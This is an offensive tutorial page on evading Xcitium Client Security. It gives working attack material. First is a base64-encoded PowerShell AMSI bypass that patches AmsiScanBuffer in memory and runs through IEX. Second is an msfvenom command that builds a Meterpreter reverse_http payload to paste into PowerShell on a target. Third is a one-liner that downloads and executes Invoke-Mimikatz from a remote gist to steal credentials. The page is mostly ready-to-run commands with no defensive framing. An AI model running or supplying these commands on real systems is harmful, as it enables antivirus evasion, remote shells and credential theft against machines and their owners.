# Xcitium Client Security

## AMSI Bypass

If you need to run some Powershell command that is being blocked by AMSI, try running this command to get around it:

![](<../Windows Defender/Images/amsi\_bypass3.png>) https://gist.githubusercontent.com/FatRodzianko/c8a76537b5a87b850c7d158728717998/raw/36103d12eec662d532c9127f2396bc347d13c3c5/my-am-bypass.ps1

You can base64 encode the command to be one line. Use CyberChef to encode the code to base64.

![](<../Windows Defender/Images/amsi\_bypass2.png>) CyberChef URL:

https://icyberchef.com/#recipe=To\_Base64('A-Za-z0-9%2B/%3D')\&input=JFdpbjMyID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgV2luMzIgewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cgp9CiJACgpBZGQtVHlwZSAkV2luMzIKJHRlc3QgPSBbQnl0ZVtdXSgweDYxLCAweDZkLCAweDczLCAweDY5LCAweDJlLCAweDY0LCAweDZjLCAweDZjKQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeShbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHRlc3QpKQokdGVzdDIgPSBbQnl0ZVtdXSAoMHg0MSwgMHg2ZCwgMHg3MywgMHg2OSwgMHg1MywgMHg2MywgMHg2MSwgMHg2ZSwgMHg0MiwgMHg3NSwgMHg2NiwgMHg2NiwgMHg2NSwgMHg3MikKJEFkZHJlc3MgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTG9hZExpYnJhcnksIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkdGVzdDIpKQokcCA9IDAKW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCkKJFBhdGNoID0gW0J5dGVbXV0gKDB4MzEsIDB4QzAsIDB4MDUsIDB4NzgsIDB4MDEsIDB4MTksIDB4N0YsIDB4MDUsIDB4REYsIDB4RkUsIDB4RUQsIDB4MDAsIDB4QzMpCiMwOiAgMzEgYzAgICAgICAgICAgICAgICAgICAgeG9yICAgIGVheCxlYXgKIzI6ICAwNSA3OCAwMSAxOSA3ZiAgICAgICAgICBhZGQgICAgZWF4LDB4N2YxOTAxNzgKIzc6ICAwNSBkZiBmZSBlZCAwMCAgICAgICAgICBhZGQgICAgZWF4LDB4ZWRmZWRmCiNjOiAgYzMgICAgICAgICAgICAgICAgICAgICAgcmV0IApbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJEFkZHJlc3MsICRQYXRjaC5MZW5ndGgp

Command:

```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFdpbjMyID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgV2luMzIgewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cgp9CiJACgpBZGQtVHlwZSAkV2luMzIKJHRlc3QgPSBbQnl0ZVtdXSgweDYxLCAweDZkLCAweDczLCAweDY5LCAweDJlLCAweDY0LCAweDZjLCAweDZjKQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeShbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHRlc3QpKQokdGVzdDIgPSBbQnl0ZVtdXSAoMHg0MSwgMHg2ZCwgMHg3MywgMHg2OSwgMHg1MywgMHg2MywgMHg2MSwgMHg2ZSwgMHg0MiwgMHg3NSwgMHg2NiwgMHg2NiwgMHg2NSwgMHg3MikKJEFkZHJlc3MgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTG9hZExpYnJhcnksIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkdGVzdDIpKQokcCA9IDAKW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCkKJFBhdGNoID0gW0J5dGVbXV0gKDB4MzEsIDB4QzAsIDB4MDUsIDB4NzgsIDB4MDEsIDB4MTksIDB4N0YsIDB4MDUsIDB4REYsIDB4RkUsIDB4RUQsIDB4MDAsIDB4QzMpCiMwOiAgMzEgYzAgICAgICAgICAgICAgICAgICAgeG9yICAgIGVheCxlYXgKIzI6ICAwNSA3OCAwMSAxOSA3ZiAgICAgICAgICBhZGQgICAgZWF4LDB4N2YxOTAxNzgKIzc6ICAwNSBkZiBmZSBlZCAwMCAgICAgICAgICBhZGQgICAgZWF4LDB4ZWRmZWRmCiNjOiAgYzMgICAgICAgICAgICAgICAgICAgICAgcmV0IApbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJEFkZHJlc3MsICRQYXRjaC5MZW5ndGgp")) | IEX
```

### Execution

![](<../Xcitium Client Security/Images/amsi-bypass.png>)

## Metasploit payload based on Powershell script

Xcitium Client Security fails to observe commands that are executed in cmd and Powershell, because of this lack of observation it is possible to run a payload based Powershell script without needing any obfuscation. The only "problem" is the AMSI, which can be easily bypassed.

On the attacker's machine, create the payload using the command:

```
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<HOST> LPORT=<PORT> -f psh-reflection
```

![](<../Xcitium Client Security/Images/msfv-pl-gen.png>)

On the target server, bypass AMSI using [command](https://github.com/MrEmpy/Awesome-AV-EDR-XDR-Bypass/tree/main/Xcitium%20Client%20Security#xcitium-client-security) shown above and then copy and paste the payload into Powershell.

### Execution

![](<../Xcitium Client Security/Images/ps-pl-msfv.png>)

Note: in the screenshot at I encoded in Base64 to be in just one line.

![](<../Xcitium Client Security/Images/ps-pl-success1.png>)

![](<../Xcitium Client Security/Images/ps-pl-success2.png>)

## Running Mimikatz via Powershell

As discussed above about the lack of concern with the execution of commands via Powershell by Client Security, a simple command to load Mimikatz via Powershell is enough.

Command:

```
iex(wget https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/e32760420ae642123599b6c9c2fddde2ecaf7a2b/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
```

![](<../Xcitium Client Security/Images/mimikatz-bypass1.png>)

![](<../Xcitium Client Security/Images/mimikatz-bypass.png>)
